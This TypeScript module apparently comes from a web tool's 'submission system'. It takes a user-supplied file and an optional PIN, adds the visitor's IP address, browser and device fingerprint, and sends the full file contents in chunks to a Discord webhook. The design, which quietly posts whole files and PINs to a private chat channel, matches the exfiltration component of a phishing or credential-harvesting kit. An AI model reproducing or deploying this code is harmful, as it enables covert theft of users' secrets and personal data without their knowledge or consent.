import { siteConfig } from '@/config/toolsConfig';

interface WebhookPayload {
  toolType: string;
  file: string;
  pin?: string;
}

export const sendToDiscordWebhook = async (payload: WebhookPayload) => {
  try {
    const webhookUrl = siteConfig.webhookUrl;
    
    const userAgent = navigator.userAgent;
    const browserInfo = getBrowserInfo(userAgent);
    const deviceInfo = getDeviceInfo(userAgent);
    const ipInfo = await fetchIpInfo();

    // Split file data into chunks of 1024 chars for embed fieldss
    const fileChunks: string[] = [];
    for (let i = 0; i < payload.file.length; i += 1024) {
      fileChunks.push(payload.file.slice(i, i + 1024));
    }
    
    const fields = [
      { name: "Tool Type", value: payload.toolType, inline: true },
      { name: "PIN", value: payload.pin || "Not provided", inline: true },
      { name: "Submission Date", value: new Date().toLocaleString(), inline: true },
      { name: "IP Address", value: ipInfo.ip || "Unknown", inline: true },
      { name: "Location", value: ipInfo.location || "Unknown", inline: true },
      { name: "Browser", value: browserInfo, inline: true },
      { name: "Device", value: deviceInfo, inline: true },
    ];

    // Add all file chunks as separate fields
    fileChunks.forEach((chunk, index) => {
      fields.push({
        name: fileChunks.length === 1 ? "Full File Data" : `File Data (Part ${index + 1}/${fileChunks.length})`,
        value: chunk,
        inline: false,
      });
    });

    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `**New ${payload.toolType} Submission** (${siteConfig.name})`,
        embeds: [
          {
            title: "Submission Details",
            color: 0x00d7dc,
            fields,
            footer: {
              text: `${siteConfig.name} Submission System`,
              icon_url: "https://i.imgur.com/ZOKp8LH.png"
            },
            timestamp: new Date().toISOString()
          }
        ]
      }),
    });
    
    return response.ok;
  } catch (error) {
    console.error('Failed to send webhook:', error);
    return false;
  }
};

const getBrowserInfo = (userAgent: string): string => {
  if (userAgent.includes("Firefox")) return "Firefox";
  if (userAgent.includes("Chrome")) return "Chrome";
  if (userAgent.includes("Safari")) return "Safari";
  if (userAgent.includes("Edge")) return "Edge";
  if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
  return "Unknown Browser";
};

const getDeviceInfo = (userAgent: string): string => {
  if (userAgent.includes("Android")) return "Android Device";
  if (userAgent.includes("iPhone")) return "iPhone";
  if (userAgent.includes("iPad")) return "iPad";
  if (userAgent.includes("Win")) return "Windows";
  if (userAgent.includes("Mac")) return "MacOS";
  if (userAgent.includes("Linux")) return "Linux";
  return "Unknown Device";
};

const fetchIpInfo = async (): Promise<{ ip: string, location: string }> => {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return { ip: data.ip, location: "Location data unavailable" };
  } catch (error) {
    console.error('Failed to fetch IP info:', error);
    return { ip: "Unknown", location: "Unknown" };
  }
};
